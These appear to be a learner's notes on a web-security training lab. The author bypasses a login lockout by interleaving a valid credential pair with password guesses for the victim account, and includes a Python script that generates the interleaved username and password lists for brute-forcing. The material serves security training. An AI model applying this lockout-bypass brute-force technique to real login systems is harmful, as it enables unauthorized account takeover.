This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- Candidate passwords

---

The app has an information error letting me know if i have the correct username. The app locks the user out after 3 attempts.

As i read before in the previous explanation, i can put a correct user/pass combo to stop the lock out from firing. 

So for my pass list i will need to have my user/pass every two entries to reset the lock out mechanism.

I need to make a python script to set up the usernames and pass otherwise i'll have to add the entries manually. 

```python
#!/usr/bin/python3

print("########## Usernames ##########")
for i in range(150):
	if i % 3: 
		print("carlos")
	else:
		print("wiener")

print("########## Passwords ##########")
with open("passwords.txt", "r") as f:
	lines = f.readlines()

i = 0
for pwd in lines:
	if i % 3:
		print(pwd.strip("\n"))
	else:
		print("peter")
		print(pwd.strip("\n"))
		i = i+1
	i = i+1
```

